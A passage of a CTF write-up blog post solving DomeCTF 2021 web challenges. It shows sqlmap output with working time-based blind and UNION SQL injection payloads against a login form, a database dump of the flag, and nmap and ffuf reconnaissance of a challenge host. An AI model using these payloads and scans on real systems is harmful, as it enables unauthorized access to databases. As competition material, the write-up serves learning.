+[21:28:10] [INFO] testing for SQL injection on POST parameter '</span>username<span class="s1">'
+[21:28:10] [INFO] testing '</span>AND boolean-based blind - WHERE or HAVING clause<span class="s1">'
+[21:28:20] [INFO] testing '</span>Boolean-based blind - Parameter replace <span class="o">(</span>original value<span class="o">)</span><span class="s1">'
+[21:28:21] [INFO] testing '</span>MySQL <span class="o">&gt;=</span> 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="o">(</span>EXTRACTVALUE<span class="o">)</span><span class="s1">'
+[21:28:27] [INFO] testing '</span>PostgreSQL AND error-based - WHERE or HAVING clause<span class="s1">'
+[21:28:31] [INFO] testing '</span>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause <span class="o">(</span>IN<span class="o">)</span><span class="s1">'
+[21:28:36] [INFO] testing '</span>Oracle AND error-based - WHERE or HAVING clause <span class="o">(</span>XMLType<span class="o">)</span><span class="s1">'
+[21:28:41] [INFO] testing '</span>Generic inline queries<span class="s1">'
+[21:28:42] [INFO] testing '</span>PostgreSQL <span class="o">&gt;</span> 8.1 stacked queries <span class="o">(</span>comment<span class="o">)</span><span class="s1">'
+[21:28:46] [INFO] testing '</span>Microsoft SQL Server/Sybase stacked queries <span class="o">(</span>comment<span class="o">)</span><span class="s1">'
+[21:28:51] [INFO] testing '</span>Oracle stacked queries <span class="o">(</span>DBMS_PIPE.RECEIVE_MESSAGE - comment<span class="o">)</span><span class="s1">'
+[21:28:56] [INFO] testing '</span>MySQL <span class="o">&gt;=</span> 5.0.12 AND time-based blind <span class="o">(</span>query SLEEP<span class="o">)</span><span class="s1">'
+[21:29:10] [INFO] POST parameter '</span>username<span class="s1">' appears to be '</span>MySQL <span class="o">&gt;=</span> 5.0.12 AND time-based blind <span class="o">(</span>query SLEEP<span class="o">)</span><span class="s1">' injectable 
+it looks like the back-end DBMS is '</span>MySQL<span class="s1">'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for '</span>MySQL<span class="s1">' extending provided level (1) and risk (1) values? [Y/n] Y
+[21:29:10] [INFO] testing '</span>Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 1 to 20 columns<span class="s1">'
+[21:29:10] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[21:29:13] [INFO] '</span>ORDER BY<span class="s1">' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[21:29:18] [INFO] target URL appears to have 2 columns in query
+[21:29:22] [INFO] POST parameter '</span>username<span class="s1">' is '</span>Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 1 to 20 columns<span class="s1">' injectable
+POST parameter '</span>username<span class="s1">' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=hmxg'</span> AND <span class="o">(</span>SELECT 1049 FROM <span class="o">(</span>SELECT<span class="o">(</span>SLEEP<span class="o">(</span>5<span class="o">)))</span>OyUh<span class="o">)</span> AND <span class="s1">'fLND'</span><span class="o">=</span><span class="s1">'fLND&amp;password=
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: username=hmxg'</span> UNION ALL SELECT CONCAT<span class="o">(</span>0x71707a6271,0x79666b61545554474a6f6c6f76467278506c6961615a6179625a74445a6a445868794e4e70596a64,0x71707a7871<span class="o">)</span>,NULL-- -&amp;password<span class="o">=</span>
+<span class="nt">---</span>
+<span class="k">do </span>you want to exploit this SQL injection? <span class="o">[</span>Y/n] Y
+<span class="o">[</span>21:29:22] <span class="o">[</span>INFO] the back-end DBMS is MySQL
+
+
+<span class="o">[</span>21:29:35] <span class="o">[</span>INFO] table <span class="s1">'SqliDB.sqladminuser'</span> dumped to CSV file <span class="s1">'/home/an0n4ce/.local/share/sqlmap/output/brut.2021.domectf.in/dump/SqliDB/sqladminuser.csv'</span>
+<span class="o">[</span>21:29:35] <span class="o">[</span>INFO] fetching columns <span class="k">for </span>table <span class="s1">'flag'</span> <span class="k">in </span>database <span class="s1">'flag'</span>
+<span class="o">[</span>21:29:36] <span class="o">[</span>INFO] fetching entries <span class="k">for </span>table <span class="s1">'flag'</span> <span class="k">in </span>database <span class="s1">'flag'</span>
+Database: flag
+Table: flag
+<span class="o">[</span>1 entry]
++----+-------------------------------------------+
+| <span class="nb">id</span> | flag                                      |
++----+-------------------------------------------+
+| 1  | domectf<span class="o">{</span>kvKBs5kmReB5yqHg7nwNcvd9mCN6tHNb<span class="o">}</span> |
++----+-------------------------------------------+
+
+
+</pre></table></code></div></div><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>domectf{kvKBs5kmReB5yqHg7nwNcvd9mCN6tHNb}
+</pre></table></code></div></div><hr /><h2 id="greenland---travel">Greenland - Travel</h2><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/green/greenland.png" alt="" /></p><p>Challenge: <a href="https://travel.2021.domectf.in/">https://travel.2021.domectf.in/</a></p><p>Here we can see a nice themed webpage, and noting got from there :(</p><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/green/1.png" alt="" /></p><p>when i scan all ports with <code class="language-plaintext highlighter-rouge">nmap</code> on webserver there is an interesting port <code class="language-plaintext highlighter-rouge">8080</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>➜  nmap <span class="nt">-p-</span> travel.2021.domectf.in <span class="nt">--min-rate</span> 10000                               
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-19 21:50 IST
+Nmap scan report <span class="k">for </span>travel.2021.domectf.in <span class="o">(</span>169.45.75.5<span class="o">)</span>
+Host is up <span class="o">(</span>0.32s latency<span class="o">)</span><span class="nb">.</span>
+rDNS record <span class="k">for </span>169.45.75.5: 5.4b.2da9.ip4.static.sl-reverse.com
+Not shown: 65531 filtered ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+443/tcp  open  https
+8080/tcp open  http-proxy
+</pre></table></code></div></div><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/green/2.png" alt="" /></p><p>It gives out <code class="language-plaintext highlighter-rouge">Admin Backend</code>, So let’s start FUZZing.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre>➜  ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-u</span> https://travel.2021.domectf.in:8080/FUZZ <span class="nt">-t</span> 200
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://travel.2021.domectf.in:8080/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 200
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 13, Words: 2, Lines: 1]
+
+# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 13, Words: 2, Lines: 1]
+# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 13, Words: 2, Lines: 1]
+admin                   [Status: 200, Size: 91, Words: 2, Lines: 8]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+
+</span></pre></table></code></div></div><p>We can see <code class="language-plaintext highlighter-rouge">base64</code> encoded flag on <code class="language-plaintext highlighter-rouge">/admin</code> directory.</p><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/green/3.png" alt="" /></p><p>Decode to get your flag.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>➜  <span class="nb">echo</span> <span class="s1">'ZG9tZWN0Zntka3kzQWxreWZjaW5rRjZNWWxWcEFzOU9zWDlab0FXV30='</span> | <span class="nb">base64</span> <span class="nt">-d</span>                                                                                
+domectf<span class="o">{</span>dky3AlkyfcinkF6MYlVpAs9OsX9ZoAWW<span class="o">}</span> 
+</pre></table></code></div></div><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>domectf{dky3AlkyfcinkF6MYlVpAs9OsX9ZoAWW}
+</pre></table></code></div></div><h2 id="happy-hacking">Happy Hacking!</h2></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/blog/categories/ctf-writeups/'>CTF-WriteUps</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/blog/tags/ctf/" class="post-tag no-text-decoration" >ctf</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=DomeCTF 2021 - an0n4ce&url=https://an0n4ce.github.io/blog/posts/domectf-2021-writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=DomeCTF 2021 - an0n4ce&u=https://an0n4ce.github.io/blog/posts/domectf-2021-writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=DomeCTF 2021 - an0n4ce&url=https://an0n4ce.github.io/blog/posts/domectf-2021-writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/blog/posts/the-sticker-shop-tryhackme/">The Sticker Shop - TryHackMe</a><li><a href="/blog/posts/tricksterctf-tryhackme-writeup/">TricksterCTF - TryHackMe</a><li><a href="/blog/posts/explore-hackthebox/">Explore - HackTheBox</a><li><a href="/blog/posts/smag-grotto-tryhackme/">Smag Grotto - TryHackMe</a><li><a href="/blog/posts/domectf-2021-writeup/">DomeCTF 2021</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/blog/tags/linux/">linux</a> <a class="post-tag" href="/blog/tags/privesc/">privesc</a> <a class="post-tag" href="/blog/tags/ctf/">ctf</a> <a class="post-tag" href="/blog/tags/easy/">easy</a> <a class="post-tag" href="/blog/tags/gtfobin/">gtfobin</a> <a class="post-tag" href="/blog/tags/box/">box</a> <a class="post-tag" href="/blog/tags/cve/">cve</a> <a class="post-tag" href="/blog/tags/adb/">adb</a> <a class="post-tag" href="/blog/tags/android/">android</a> <a class="post-tag" href="/blog/tags/code/">code</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/blog/posts/tamilctf21/"><div class="card-body"> <span class="timeago small" >May 24, 2021<i class="unloaded">2021-05-24T11:30:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tamil CTF 2021</h3><div class="text-muted small"><p> Challenge - Writeups Web Akka University Going through webpage, there is a Download Now button to get Exam question papers, When checking every picture they give, There is something i...</p></div></div></a></div><div class="card"> <a href="/blog/posts/GravithonCTF-21/"><div class="card-body"> <span class="timeago small" >Sep 2, 2021<i class="unloaded">2021-09-02T09:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Gravithon CTF 2021</h3><div class="text-muted small"><p> I secured 7th position in the 24 hour Gravithon CTF 2021 at the Indian Tech Fest. Challenges-Writeups Welcome Warm Welcome Flag is given there. gravithon{W3lc0me&amp;Welcome_t0_Gr4v1th0n_2...</p></div></div></a></div><div class="card"> <a href="/blog/posts/the-sticker-shop-tryhackme/"><div class="card-body"> <span class="timeago small" >Jan 5<i class="unloaded">2026-01-05T22:11:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>The Sticker Shop - TryHackMe</h3><div class="text-muted small"><p> Room : https://tryhackme.com/room/thestickershop Author : toxicat0r Reconnaissance Let’s began with an Nmap scan to understand what services were running on the target machine. 1 2 3 4 5 6 7 ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/blog/posts/year-of-the-jellyfish-tryhackme/" class="btn btn-outline-primary" prompt="Older"><p>Year Of the JellyFish - TryHackMe</p></a> <a href="/blog/posts/explore-hackthebox/" class="btn btn-outline-primary" prompt="Newer"><p>Explore - HackTheBox</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2026 <a href="https://twitter.com/an0n4ce">Vishnu Sudhakaran</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://an0n4ce.github.io" target="_blank" rel="noopener">an0n4ce</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/blog/tags/linux/">linux</a> <a class="post-tag" href="/blog/tags/privesc/">privesc</a> <a class="post-tag" href="/blog/tags/ctf/">ctf</a> <a class="post-tag" href="/blog/tags/easy/">easy</a> <a class="post-tag" href="/blog/tags/gtfobin/">gtfobin</a> <a class="post-tag" href="/blog/tags/box/">box</a> <a class="post-tag" href="/blog/tags/cve/">cve</a> <a class="post-tag" href="/blog/tags/adb/">adb</a> <a class="post-tag" href="/blog/tags/android/">android</a> <a class="post-tag" href="/blog/tags/code/">code</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://an0n4ce.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/blog/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-P5KFKWQ6YG"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-P5KFKWQ6YG'); }); </script>
